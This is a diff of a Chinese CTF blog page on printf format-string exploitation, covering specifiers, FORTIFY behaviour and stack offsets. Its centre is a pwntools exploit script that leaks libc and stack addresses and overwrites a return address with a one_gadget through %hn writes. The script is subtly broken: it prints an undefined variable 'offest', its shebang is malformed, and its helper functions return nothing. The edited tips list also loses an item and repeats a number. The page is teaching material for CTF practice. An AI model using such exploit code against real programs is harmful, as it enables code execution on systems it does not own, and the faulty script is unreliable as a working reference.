@@ -166,14 +166,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/pwn/" style="color: #03a9f4">
+                <a href="/tags/pwn/" style="color: #00a596">
                     pwn
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/fmt/" style="color: #00a596">
+                <a href="/tags/fmt/" style="color: #00bcd4">
                     fmt
                 </a>
             </span>
@@ -187,14 +187,13 @@
 <h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
 <p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
 <p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
-<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>2、格式化字符串：hhn 单字节、hn 双字节、n 四字节。</p>
-<p>##格式字符串<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
+<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
 <p>_printf_chk与printf主要有以下几点不同：   </p>
 <pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
 2、在使用%n时会进行一些检查。
 </code></pre>
 <p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
-<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/fomat_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
+<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
 <pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
 </code></pre>
 <p>首先程序会对函数依次进行以下操作：  </p>
@@ -211,7 +210,90 @@
 <p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
 <p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
 <p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
-<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python">!/usr/<span class="hljs-built_in">bin</span>/python3<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><br><br><span class="hljs-comment">#context.terminal = [&#x27;xterm&#x27;, &#x27;-e&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;xfce4-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>]<br><span class="hljs-comment">#终端更换</span><br><br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p= remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28406</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">content,payload</span>):<br>    p.sendafter(content,payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">content,payload</span>):<br>    p.sendlineafter(content,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uc64</span>():<br>    u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uc32</span>():<br>    u32(p.recvuntil(<span class="hljs-string">b&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_fmt</span>(<span class="hljs-params">pad</span>):<span class="hljs-comment">#自动获取到fmt的pad</span><br>    p = process(<span class="hljs-string">&quot;./fmt&quot;</span>)<br>    <span class="hljs-comment"># send 还是 sendline以程序为准</span><br>    p.send(pad)<br>    <span class="hljs-keyword">return</span> p.recv()<br>payload=<span class="hljs-string">b&#x27;%3$p&#x27;</span>+<span class="hljs-string">b&#x27;%6$p&#x27;</span><br>sa(<span class="hljs-string">&quot;keyword&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>got=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;got=&quot;</span>,<span class="hljs-built_in">hex</span>(got))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0xc8</span>+<span class="hljs-number">0x10</span><br>tar=stack+<span class="hljs-number">0xe0</span>-<span class="hljs-number">0x100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tar=&quot;</span>,<span class="hljs-built_in">hex</span>(tar))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack=&quot;</span>,<span class="hljs-built_in">hex</span>(stack))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>one=got+<span class="hljs-number">0xf1247</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;one=&quot;</span>,<span class="hljs-built_in">hex</span>(one))<br><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(tar&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c%11$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.send(payload)<br><span class="hljs-comment">#改写当前链为ret的链</span><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((one&amp;<span class="hljs-number">0xffff</span>)).encode()+<span class="hljs-string">b&#x27;c%37$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br>p.send(payload)<br>p.recv()<br> <span class="hljs-comment">#改ret第二位为one</span><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((tar&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-number">2</span>).encode()+<span class="hljs-string">b&#x27;c%11$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.send(payload)<br><span class="hljs-comment">#ret地址+2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>one=one&gt;&gt;<span class="hljs-number">16</span><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((one&amp;<span class="hljs-number">0xffff</span>)).encode()+<span class="hljs-string">b&#x27;c%37$hn\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br>p.send(payload)<br><span class="hljs-comment">#改ret地址+2的第二位地址为one</span><br><br>inter()<br><br></code></pre></td></tr></table></figure>
+<pre><code>!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+import os
+
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+
+
+#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
+context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
+#终端更换
+
+p=process(&quot;./pwn&quot;)
+p= remote(&#39;node5.buuoj.cn&#39;,28406)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pwn&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+    
+def sa(content,payload):
+    p.sendafter(content,payload)
+    
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
+
+def exec_fmt(pad):#自动获取到fmt的pad
+    p = process(&quot;./fmt&quot;)
+    # send 还是 sendline以程序为准
+    p.send(pad)
+    return p.recv()
+payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
+sa(&quot;keyword&quot;,payload)
+p.recvuntil(b&#39;0x&#39;)
+got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
+print(&quot;got=&quot;,hex(got))
+p.recvuntil(b&#39;0x&#39;)
+stack=int(p.recv(12),16)-0xc8+0x10
+tar=stack+0xe0-0x100
+print(&quot;tar=&quot;,hex(tar))
+print(&quot;stack=&quot;,hex(stack))
+p.recvuntil(b&#39;0x&#39;)
+one=got+0xf1247
+print(&quot;one=&quot;,hex(one))
+
+
+payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#改写当前链为ret的链
+
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+p.recv()
+ #改ret第二位为one
+
+payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#ret地址+2
+
+print(&quot;offest=&quot;,hex(offest))
+one=one&gt;&gt;16
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+#改ret地址+2的第二位地址为one
+
+inter()
 </code></pre>
 <p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
 <p><img src="/images/gdb_fmt.png" alt="图片"></p>
